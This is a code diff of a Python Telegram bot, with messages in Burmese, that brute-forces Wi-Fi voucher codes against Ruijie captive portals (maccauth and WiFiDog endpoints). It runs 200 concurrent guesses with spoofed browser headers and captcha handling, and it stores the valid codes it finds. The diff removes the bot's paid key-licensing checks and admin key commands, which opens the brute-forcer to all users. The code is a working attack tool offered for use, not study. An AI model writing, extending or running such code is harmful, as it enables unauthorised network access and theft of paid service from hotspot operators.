@@ -20,11 +20,9 @@ SUCCESS_CODE = asyncio.Queue()
 bot = AsyncTeleBot(BOT_TOKEN)
 
 user_data = {}
-approve = {}
 scan_tasks = {}
 success_texts = {}
 limited_texts = {}
-captcha_state = {}
 notify_setting = {}
 last_scan_params = {}
 pending_brute = {}
@@ -35,10 +33,10 @@ CONCURRENCY = 200
 _voucher_sem = None
 _start_time = time.monotonic()
 
-# ── WiFiDog sampled logging counters ──────────────────────────────────────
+# ── WiFiDog sampled logging counter ──────────────────────────────────────
 _wifidog_counter = {"total": 0, "success": 0, "limit": 0, "err": 0}
 
-# ── Web server (keep alive) ────────────────────────────────────────────────
+# ── Web server ────────────────────────────────────────────────────────────
 async def handle(request):
     return web.Response(text="Bot is awake and running 24/7!")
 
@@ -65,44 +63,6 @@ async def update_file_content(path, content, sha, message):
         return await response.text()
 
 # ── Helper functions ───────────────────────────────────────────────────────
-def check_key_expiration(expiration_time):
-    try:
-        if isinstance(expiration_time, dict):
-            expiry = expiration_time.get("expires_at")
-            if expiry == "9999-12-31T23:59:59Z":
-                return True
-            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
-            return datetime.now(timezone.utc) < exp_time
-        mm, hh, dd, MM, yyyy = map(int, expiration_time.split('-'))
-        expiration_dt = datetime(
-            year=yyyy, month=MM, day=dd, hour=hh, minute=mm,
-            second=0, tzinfo=timezone.utc
-        )
-        return datetime.now(timezone.utc) < expiration_dt
-    except Exception as e:
-        print("Key parse error:", e)
-        return False
-
-def generate_expiry(plan):
-    now = datetime.now(timezone.utc)
-    if plan == "unlimited":
-        return "9999-12-31T23:59:59Z"
-    total_seconds = 0
-    parts = re.findall(r'(\d+)([dhm])', plan)
-    if not parts:
-        return None
-    for val, unit in parts:
-        val = int(val)
-        if unit == 'd':
-            total_seconds += val * 86400
-        elif unit == 'h':
-            total_seconds += val * 3600
-        elif unit == 'm':
-            total_seconds += val * 60
-    if total_seconds == 0:
-        return None
-    return (now + timedelta(seconds=total_seconds)).isoformat()
-
 def iter_codes(mode):
     if mode in ["6", "7"]:
         length = int(mode)
@@ -153,16 +113,9 @@ async def Code_Expires_Date(session_id):
     headers = {
         'authority': 'portal-as.ruijienetworks.com',
         'accept': 'application/json, text/javascript, */*; q=0.01',
-        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
         'content-type': 'application/json;',
         'referer': f'https://portal-as.ruijienetworks.com/download/static/auth/src/balance.html?sessionId={session_id}',
-        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Linux"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
+        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
         'x-requested-with': 'XMLHttpRequest',
     }
     try:
@@ -229,7 +182,7 @@ async def get_session_id(session_obj, session_url, previous_session_id=None):
 async def Captcha_Image(session_obj, session_id):
     headers = {
         'authority': 'portal-as.ruijienetworks.com',
-        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
+        'accept': 'image/*,*/*;q=0.8',
         'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}',
         'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
     }
@@ -252,7 +205,6 @@ async def Varify_Captcha(session_obj, session_id, text):
         return session_id if data.get("success") == True else None
 
 def detect_portal_type(url):
-    """URL ကနေ portal type ခွဲခြားပါ"""
     if '/api/auth/wifidog' in url or 'wifidog' in url.lower():
         return "wifidog"
     if 'maccauth' in url:
@@ -264,7 +216,6 @@ async def check_session_url(session_url):
         from urllib.parse import urlparse, parse_qs
         parsed = urlparse(session_url)
         params = parse_qs(parsed.query)
-
         portal_type = detect_portal_type(session_url)
         if portal_type == "wifidog":
             required = ['gw_id', 'gw_address', 'gw_port', 'mac', 'ip']
@@ -394,10 +345,8 @@ async def perform_check_maccauth(session_url, code, chat_id, scan_id=None, reche
                 pass
     return None
 
-# ── WiFiDog voucher check — SAMPLED LOGGING ───────────────────────────
+# ── WiFiDog voucher check ─────────────────────────────────────────────
 async def perform_check_wifidog(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
-    """WiFiDog portal — sampled logging (100 requests တစ်ခါ)"""
-
     if not recheck:
         current_task = scan_tasks.get(chat_id)
         if not current_task or current_task.get("scan_id") != scan_id:
@@ -429,7 +378,6 @@ async def perform_check_wifidog(session_url, code, chat_id, scan_id=None, rechec
         "referer":    session_url,
         "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36",
     }
-
     params = {
         "stage":      "validate",
         "gw_id":      gw_id,
@@ -467,7 +415,7 @@ async def perform_check_wifidog(session_url, code, chat_id, scan_id=None, rechec
         _wifidog_counter["err"] += 1
         err_msg = str(e)[:60]
 
-    # ✅ SAMPLED LOG — 100 requests တစ်ခါ
+    # Sampled log — 100 requests တစ်ခါ
     if _wifidog_counter["total"] % 100 == 0:
         print(
             f"[WiFiDog] checked={_wifidog_counter['total']:,} | "
@@ -490,7 +438,6 @@ async def perform_check_wifidog(session_url, code, chat_id, scan_id=None, rechec
     if not _wifidog_is_success(response, status):
         return
 
-    # ── SUCCESS ──
     _wifidog_counter["success"] += 1
     print(f"🎉 [WiFiDog] SUCCESS! code={code} resp={response[:100]}")
 
@@ -544,7 +491,7 @@ def _wifidog_is_success(response_text, status_code):
         return True
     return False
 
-# ── Unified perform_check — auto-detect ─────────────────────────────
+# ── Unified perform_check ─────────────────────────────────────────────
 async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
     portal_type = user_data.get(chat_id, {}).get('portal_type') or detect_portal_type(session_url)
 
@@ -576,7 +523,6 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, target=None, messa
 
     checked = 0
     found = 0
-    last_key_check = time.monotonic()
     scan_start = time.monotonic()
 
     global _voucher_sem
@@ -601,18 +547,6 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, target=None, messa
                     break
             if not batch:
                 break
-
-            if time.monotonic() - last_key_check >= 600:
-                auth_list, _ = await get_file_content("auth_list.json")
-                if (
-                    str(chat_id) not in auth_list
-                    or not check_key_expiration(auth_list[str(chat_id)])
-                ):
-                    approve[chat_id] = False
-                    await bot.send_message(chat_id, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
-                    scan_tasks.pop(chat_id, None)
-                    return
-                last_key_check = time.monotonic()
 
             async def _check(code):
                 async with _voucher_sem:
@@ -651,7 +585,11 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, target=None, messa
 
         if progress_msg:
             try:
-                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text="✅ Scan completed.")
+                await bot.edit_message_text(
+                    chat_id=chat_id,
+                    message_id=progress_msg.message_id,
+                    text="✅ Scan completed."
+                )
             except:
                 pass
         scan_tasks.pop(chat_id, None)
@@ -661,7 +599,6 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, target=None, messa
 
 # ── GitHub update scheduler ────────────────────────────────────────────
 async def github_update_scheduler():
-    global SUCCESS_CODE
     while True:
         await asyncio.sleep(80)
         items = []
@@ -690,37 +627,20 @@ async def start(message):
 async def help_cmd(message):
     help_text = (
         "📚 **Command လမ်းညွှန်**\n\n"
-        "/key - သင်၏ key ကို အတည်ပြုရန်\n"
         "/setup [session_url] - Session URL သတ်မှတ်ရန်\n"
         "   WiFiDog + Maccauth URL နှစ်မျိုးလုံး OK\n"
         "/brute <length> [target] - Code စတင်ရှာဖွေရန်\n"
         "   ဥပမာ /brute 6 10\n"
+        "   /brute 6 (အားလုံးရှာ)\n"
+        "   /brute 8, /brute ascii-lower, /brute all\n"
         "/stop - ရပ်ရန်\n"
         "/resume - ပြန်စရန်\n"
         "/saved - ရှာတွေ့ထားသော codes ကြည့်ရန်\n"
         "/notify - Notification On/Off\n"
         "/recheck - Success codes ပြန်စစ်ရန်\n"
-        "/status - (Admin) Bot Status\n"
-        "/genkey <duration> <user_id> - (Admin) Key ထုတ်ပေးရန်\n"
-        "/delkey <user_id> - (Admin) Key ဖျက်ရန်\n"
-        "/listkeys - (Admin) Key များကြည့်ရန်"
+        "/status - (Admin) Bot Status"
     )
     await bot.reply_to(message, help_text, parse_mode="Markdown")
-
-@bot.message_handler(commands=['key'])
-async def handle_key(message):
-    key = str(message.chat.id)
-    auth_list, _ = await get_file_content("auth_list.json")
-    if key in auth_list:
-        if check_key_expiration(auth_list[key]):
-            approve[message.chat.id] = True
-            user_data[message.chat.id] = {}
-            await bot.reply_to(message, "✅ Key မှန်ကန်ပါသည်။ /setup ဖြင့် Session URL ထည့်ပါ။")
-        else:
-            approve[message.chat.id] = False
-            await bot.reply_to(message, "❌ Key Expired ဖြစ်နေပါသည်။")
-    else:
-        await bot.reply_to(message, "သင်၏ key ကို registered မလုပ်ရသေးပါ။")
 
 @bot.message_handler(commands=['setup'])
 async def handle_setup(message):
@@ -729,9 +649,6 @@ async def handle_setup(message):
         await bot.reply_to(message, "အသုံးပြုနည်း:\n/setup your_session_url")
         return
     url = args[1]
-    if not approve.get(message.chat.id, False):
-        await bot.reply_to(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
-        return
     await bot.reply_to(message, "Session URL စစ်ဆေးနေပါသည်...")
     if await check_session_url(url):
         user_data[message.chat.id] = user_data.get(message.chat.id, {})
@@ -762,9 +679,6 @@ async def brute(message):
             return
 
     chat_id = message.chat.id
-    if not approve.get(chat_id, False):
-        await bot.reply_to(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
-        return
     if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
         await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
         return
@@ -862,9 +776,6 @@ async def toggle_notify(message):
 @bot.message_handler(commands=['recheck'])
 async def recheck(message):
     chat_id = message.chat.id
-    if not approve.get(chat_id, False):
-        await bot.reply_to(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
-        return
     if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
         await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
         return
@@ -895,7 +806,6 @@ async def status(message):
         await bot.reply_to(message, "No Permission")
         return
     active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
-    approved_users = sum(1 for v in approve.values() if v)
     uptime_seconds = int(time.monotonic() - _start_time)
     hours, remainder = divmod(uptime_seconds, 3600)
     minutes, seconds = divmod(remainder, 60)
@@ -904,91 +814,10 @@ async def status(message):
         f"📊 Bot Status\n\n"
         f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
         f"🔍 Active Scans: {active_scans}\n"
-        f"✅ Approved Users: {approved_users}\n"
         f"👥 Sessions Loaded: {len(user_data)}\n"
         f"🌐 Connection: DIRECT (no proxy)\n"
         f"📡 WiFiDog hits: {_wifidog_counter['total']:,}"
     )
-
-@bot.message_handler(commands=['genkey'])
-async def genkey(message):
-    if str(message.chat.id) != ADMIN_ID:
-        await bot.reply_to(message, "No Permission")
-        return
-    args = message.text.split()
-    if len(args) < 3:
-        await bot.reply_to(message, "Usage:\n/genkey 1h30m 123456789\n/genkey unlimited 123456789")
-        return
-    plan = args[1]
-    user_id = args[2]
-    expiry = generate_expiry(plan)
-    if not expiry:
-        await bot.reply_to(message, "Duration ပုံစံမမှန်ပါ။ ဥပမာ: 30m, 1h, 2d, 1h30m, unlimited")
-        return
-    auth_list, sha = await get_file_content("auth_list.json")
-    auth_list[user_id] = {"expires_at": expiry, "plan": plan}
-    await update_file_content("auth_list.json", auth_list, sha, f"Add key for {user_id}")
-    await bot.reply_to(message, f"✅ Key Generated\n\nUSER ID : {user_id}\nPLAN : {plan}\nEXPIRES : {expiry}")
-
-@bot.message_handler(commands=['delkey'])
-async def delkey(message):
-    if str(message.chat.id) != ADMIN_ID:
-        await bot.reply_to(message, "No Permission")
-        return
-    args = message.text.split()
-    if len(args) < 2:
-        await bot.reply_to(message, "Usage:\n/delkey 123456789")
-        return
-    user_id = args[1]
-    auth_list, sha = await get_file_content("auth_list.json")
-    if user_id not in auth_list:
-        await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
-        return
-    del auth_list[user_id]
-    await update_file_content("auth_list.json", auth_list, sha, f"Delete key for {user_id}")
-    approve.pop(int(user_id), None)
-    user_data.pop(int(user_id), None)
-    await bot.reply_to(message, f"✅ Key Deleted\n\nUSER ID : {user_id}")
-
-@bot.message_handler(commands=['listkeys'])
-async def listkeys(message):
-    if str(message.chat.id) != ADMIN_ID:
-        await bot.reply_to(message, "No Permission")
-        return
-    try:
-        auth_list, _ = await get_file_content("auth_list.json")
-        if not auth_list:
-            await bot.reply_to(message, "Registered key မရှိသေးပါ။")
-            return
-        lines = []
-        for uid, data in auth_list.items():
-            expires = data.get("expires_at", "unknown")
-            plan = data.get("plan", "unknown")
-            if expires == "9999-12-31T23:59:59Z":
-                expires_str = "Unlimited"
-            else:
-                try:
-                    exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
-                    now = datetime.now(timezone.utc)
-                    if exp_dt < now:
-                        expires_str = "Expired"
-                    else:
-                        diff = exp_dt - now
-                        days = diff.days
-                        hours, rem = divmod(diff.seconds, 3600)
-                        minutes = rem // 60
-                        expires_str = f"{days}d {hours}h {minutes}m left"
-                except:
-                    expires_str = expires
-            lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
-        text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
-        if len(text) > 4096:
-            for i in range(0, len(text), 4096):
-                await bot.send_message(message.chat.id, text[i:i+4096])
-        else:
-            await bot.reply_to(message, text)
-    except Exception as e:
-        print(f"Error at listkeys {e}")
 
 # ── Webhook mode ──────────────────────────────────────────────────────
 async def run_webhook_mode():
